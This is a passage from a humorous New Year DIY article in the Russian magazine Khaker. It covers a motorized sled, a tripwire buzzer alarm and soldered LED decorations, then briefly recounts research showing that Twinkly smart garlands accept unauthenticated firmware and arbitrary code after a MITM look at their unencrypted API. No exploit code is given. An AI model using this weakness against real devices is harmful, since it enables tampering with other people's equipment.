как барон Мюнхгаузен на ядре. Специально для тебя прилагаю чертеж с раз‐
мерами, сможешь вырезать все детали сам из пластмассы с помощью наг‐
ретого паяльником ножа или из дерева с помощью лобзика.





                               Чертеж саней

Из электроники, как ты уже догадался, нам потребуется всего ничего: два
моторчика‑редуктора и колеса для  них,  кнопка для  запуска  двигателей
и небольшой аккумулятор — надо же нам чем‑то питать наши сани.
   Теперь паяй всё по схеме снизу и размещай на наших санях. На «Хакере»
есть статья о том, как это делать . Провода, идущие от аккумулятора и от кноп‐
ки к моторам, ты можешь выбрать любой удобной тебе длины — они будут
соединять сани с пультом, и от нее зависит, насколько далеко ты сможешь
отойти.
   Редукторы с колесами расположи по бокам, чтобы колеса чуть припод‐
нимали заднюю часть саней. А на аккумулятор или батарейку наклей кноп‐
ку — можешь использовать их как каркас для «пульта». Если после монтажа
колеса крутятся не в ту сторону, значит, стоит поменять полярность аккумуля‐
тора.





                         Схема электроники саней

Отлично, теперь у нас есть сани. Прежде чем отправляться красть на них
подарки, потренируйся в управлении. Кнопка будет двигать их вперед, а про‐
водом от «пульта» можно оттянуть сани назад. Такое вот простое управление.


ЛОВУШКА ДЛЯ САНТЫ

Сани мы сделали, доехали на них до домика ничего не подозревающих
жителей планеты Земля, проникли в дом и забрали все подарки. Легко! Но что
делать, если мы опередили Деда Мороза и он еще не пришел? Ты ведь зна‐
ешь, что он не может показываться на глаза людям. Используем эту слабость
себе во благо! Чтобы спугнуть новогоднего волшебника, нам достаточно всего
лишь его обнаружить. Для этого мы с тобой изготовим простую сигнализа‐
цию‑растяжку, которую можно установить куда угодно. На окно, на дверь,
да хоть на камин. Как только пузатый красноносый дед пролезет в квартиру,
сработает сигнализация, ее жильцы проснутся, и Дед Мороз исчезнет! Никто
не получит подарков, как и задумано.
   Для изготовления сигнализации нам потребуется прищепка, батарейка,
пара кусочков металлического проводника и пьезодинамик. Из всего списка
последний элемент не был описан в статьях на «Хакере», поэтому сейчас я
расскажу о нем подробнее.


Пьезодинамик





           Внешний вид пьезодинамика и обозначение на схеме

Одна из главных частей пьезодинамика (он же зуммер) — это мембрана.
Она‑то и издает звук. Происходит это за счет ее непрерывного колебания.
По сути, она своей вибрацией «сотрясает» воздух, так и получается писк.
Но если подать на мембрану постоянное напряжение, звука ты не услышишь,
разве что тихий щелчок. Мембрана выгнется, примет одно положение и боль‐
ше двигаться не будет. Чтобы заставить ее и дальше звучать, необходимо пос‐
тоянно менять напряжение. Сделать это можно с помощью аналогового
или цифрового сигнала, о них уже говорилось в одной из статей. Для работы
пьезодинамика необходим генератор звуковых колебаний. В большинстве
современных зуммеров он встроенный, но перед покупкой в этом лучше убе‐
диться.


Возвращаемся к сигнализации
Итак, нам осталось присоединить к концам прищепки металлические провод‐
ники (закрученная в маленькую спираль скрепка пойдет) и припаять проводки
от них. Один — к контакту зуммера, другой — к батарейке, а также соединить
оставшиеся концы. Теперь надо все как следует закрепить на скрепке, чтобы
ловушка получилась максимально компактной. И необходимо «взвести» нашу
сигнализацию. Для этого надо изготовить саму растяжку. Это будет просто
нитка, с одного конца которой привяжем тонкий диэлектрик, хотя бы кусочек
картона. Теперь его можно зажать между проводниками прищепки и уста‐
новить в нужном месте. Как только дверь откроется, диэлектрик вылетит
из зажима, и цепь замкнется. По квартире раздастся писк — все проснутся,
и Дед Мороз сбежит.





                        Ловушка на Деда Мороза готова!


ПОХИТИТЕЛИ ЕЛОК

Нет ничего лучше, чем похитить елку! Но таскать деревья я устал, поэтому ты
сделаешь елку своими руками, а я у тебя ее украду! Тебе понадобятся паяль‐
ник и светодиоды. Еще можно изготовить небольшой блок управления на базе
чипа 555, чтобы заставить нашу елку мигать. Про такую схему на «Хакере» уже
была статья, можешь посмотреть схему там, собрать ее и подключить к нашей
елке.
   Паять елку будет очень просто — достаточно последовательно соединить
все светодиоды и источник питания. Анод одного светодиода — к катоду сле‐
дующего, и так, пока не кончатся светодиоды. В конце, когда останется всего
два контакта, надо, не перепутав  их, припаять анод к плюсу батарейки,
а катод — к минусу.





                             Схема пайки елки

Теперь осталось припаять концы нашей схемы к батарейке «Крона». Елка
готова! Иду похищать.





                                         Елка

Теперь я бы хотел украсть новогоднюю звезду. Вот тебе схема пайки под‐
ходящей звезды. Немедленно принимайся за работу!





                           Схема пайки звезды

Отлично, теперь у нас и елка, и звезда есть. Все очень компактное — украв,
можно носить с собой в сумке и хвастаться.





                                   Звезда


РУКОВОДСТВО ПО ВЗЛОМУ ГИРЛЯНД

Я обещал еще рассказать о взломе гирлянд. Обычную гирлянду, которую под‐
ключают в розетку, можно взломать только физически. Вскрыть блок управле‐
ния, подключить микроконтроллер, например Arduino, и написать собственную
программу управления гирляндой. Если тебе это интересно, но ты не знаешь,
как пользоваться Arduino, то загляни на вики «Амперки», там неплохо описаны
азы управления этим микроконтроллером.
   Умные гирлянды для настоящего злодея куда привлекательнее! Ведь мож‐
но подключиться к ним по Wi-Fi и управлять каждым светодиодом отдельно.
Мои приспешники еще в далеком 2018 году заинтересовались этой темой,
изучили очень популярные IoT-гирлянды марки Twinkly и даже создали кнопку
для отключения всех подключенных в сеть гирлянд!
   Парни разобрались, как гирлянда сообщается с мобильным приложением.
Они выяснили, что сначала надо напрямую подключиться к Twinkly как к точке
доступа и настроить подключение гирлянды к домашней сети, через которую
ты будешь управлять гирляндой. Изучив сообщение, они узнали, что переда‐
ваемые данные не зашифрованы, несмотря на то что при исходной настройке
пароль от Wi-Fi и передавался в зашифрованном виде. Если шифрования нет,
значит, можно провернуть MITM и изучить работу API.
  В итоге эти лихие ребята выяснили, что можно установить на гирлянды
любую прошивку и исполнять произвольный код, ведь для этого не требуется
никакая авторизация.
   Только посмотри, они вывели на гирлянду «змейку»! А еще провели атаку,
в ходе которой на всех обнаруженных устройствах Twinkly выводится «Hack
the Planet».


MISSION COMPLETE

Мой дорогой приспешник, ты хорошо поработал, и вместе мы подготовились
к похищению  праздника. Но знаешь, я что подумал? Этот год выдался
не таким уж и простым для многих. И было бы совсем некрасиво лишать
людей возможности весело провести время в кругу семьи или друзей, так что
пускай празднуют. Зато в следующем году мы вернемся с еще большим
количеством пакостей!
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
    №12 (285)

            Андрей Письменный      Валентин Холмогоров        Илья Русанен
                Главный редактор         Ведущий редактор                Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                                        Евгения Шарипова
                                           Литературный редактор


                          MEGANEWS

                                      Мария Нефёдова
                                            nefedova@glc.ru


                                   АРТ

                                       yambuto
                                       yambuto@gmail.com


                     КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                  Иван Андреев, Олег Афонин,
                                Марк Бруцкий‑Стемпковский,
                                         Алексей Глазков, Nik Zerof,
                                   Юрий Язев


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                           Вопросы по подписке:       ​Вопросы по материалам:
                                 lapina@glc.ru                support@glc.ru​





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар»​ ​125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Зарегистрировано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ​Эл № ​ФС77-​67001 от ​30.​08.​
2016 года. Мнение редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация к раз‐
мышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция не несет
ответственности за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакцион‐
ных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2022